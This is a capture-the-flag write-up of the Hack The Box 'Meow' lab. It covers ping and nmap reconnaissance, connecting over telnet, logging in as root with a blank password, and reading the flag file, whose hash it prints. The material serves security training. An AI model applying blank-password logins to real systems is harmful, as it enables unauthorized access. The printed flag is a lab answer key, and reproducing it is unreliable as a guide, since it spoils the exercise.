#telnet #protocols #reconnaissance 

# 0. Theory

**What does the acronym VM stand for?**
*Virtual Machine*

**What tool do we use to interact with the operating system in order to issue  commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.**
*Terminal*

**What service do we use to form our VPN connection into HTB labs?**
*OpenVPN*

**What tool do we use to test our connection to the target with an ICMP echo request?**
*ping*

**What is the name of the most common tool for finding open ports on a target?**
*nmap*

**What service do we identify on port 23/tcp during our scans?**
*telnet*


# 1. Recon

Target IP: `10.129.177.133`

`ping 10.129.177.133` -c 5`

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-bgbi9poufc]─[~]
	└──╼ [★]$ ping 10.129.177.133 -c 5
	PING 10.129.177.133 (10.129.177.133) 56(84) bytes of data.
	64 bytes from 10.129.177.133: icmp_seq=1 ttl=63 time=76.4 ms
	64 bytes from 10.129.177.133: icmp_seq=2 ttl=63 time=76.7 ms
	64 bytes from 10.129.177.133: icmp_seq=3 ttl=63 time=76.4 ms
	64 bytes from 10.129.177.133: icmp_seq=4 ttl=63 time=76.2 ms
	64 bytes from 10.129.177.133: icmp_seq=5 ttl=63 time=76.4 ms


# 2. Enumeration

Using Network Mapper (**nmap**)  to scan for open ports in order to identify what kind of services are to run on the target. Using the `-sV` service detection flag to determine the name and description of the identified services.

`sudo nmap -sV 10.129.177.133`

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-bgbi9poufc]─[~]
	└──╼ [★]$ sudo nmap -sV 10.129.177.133
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 17:44 CDT
	Nmap scan report for 10.129.177.133
	Host is up (0.077s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	23/tcp open  telnet  Linux telnetd
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds

Found one: port **23/tcp** is running the **telnet** service.

Usually, connection requests through telnet are configured with username/password combinations for increased security. We can see this is the case for our target, as we are met with a Hack The Box banner and a request from the target to authenticate ourselves before being allowed to proceed with remote management of the target host.

	┌─[eu-starting-point-2-dhcp]─[10.10.15.114]─[scrage@htb-bgbi9poufc]─[~]
	└──╼ [★]$ telnet 10.129.177.133
	Trying 10.129.177.133...
	Connected to 10.129.177.133.
	Escape character is '^]'.
	
	  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
	  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
	  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
	
	
	Meow login: 

We will need to find some credentials that work to continue since there are no other ports open on the target that we could explore.

Sometimes, due to configuration mistakes, some important accounts can be left with blank passwords for the sake of accessibility. This is a significant issue with some network devices or hosts, leaving them open to simple brute-forcing attacks, where the attacker can try logging in sequentially, using a list of usernames with no password input.

Some typical important accounts have self-explanatory names, such as:
- admin
- administrator
- root

And lo' and behold, "root" works without password:

	Meow login: root
	
	Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	  System information as of Sun 25 Aug 2024 10:54:18 PM UTC
	
	  System load:           0.0
	  Usage of /:            41.7% of 7.75GB
	  Memory usage:          4%
	  Swap usage:            0%
	  Processes:             135
	  Users logged in:       0
	  IPv4 address for eth0: 10.129.177.133
	  IPv6 address for eth0: dead:beef::250:56ff:fe94:3b56
	
	 * Super-optimized for small spaces - read how we shrank the memory
	   footprint of MicroK8s to make it the smallest full K8s around.
	
	   https://ubuntu.com/blog/microk8s-memory-optimisation
	
	75 updates can be applied immediately.
	31 of these updates are standard security updates.
	To see these additional updates run: apt list --upgradable
	
	The list of available updates is more than a week old.
	To check for new updates run: sudo apt update
	
	Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
	root@Meow:~#

That is one critical finding already.
Also, there are a lot of additional intelligence gathered from this successful login and the prompt:
- Uses Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64).
- System has 7.75GB physical storage.
- IPv6 address is `dead:beef::250:56ff:fe94:3b56`
- There are 75 updates can be applied immediately; 31 of these updates are standard security updates. We can check these to know more.
- Last root login has happened on Monday, Sep  6 15:15:23 UTC 2021 from **10.10.14.18** on pts/0 - That could potentially be a root user's IP address we got there if this was a real-life target.

We can check the directory's content we landed on with the `ls` command:

	root@Meow:~# ls
	flag.txt  snap
	root@Meow:~# cat flag.txt 
	b40abdfe23665f766f9c61ecba8a4c19

And we've got a flag.
The `flag.txt` file is our target in this case. Most of Hack The Box's targets will have one of these files, which will contain a hash value called a flag . The naming convention for these targeted files varies from lab to lab. For example, weekly and retired machines will have two flags, namely `user.txt` and `root.txt` . CTF targets and other labs will have `flag.txt` . 

https://www.hackthebox.com/achievement/machine/2057492/394
![[Pasted image 20240826011913.png]]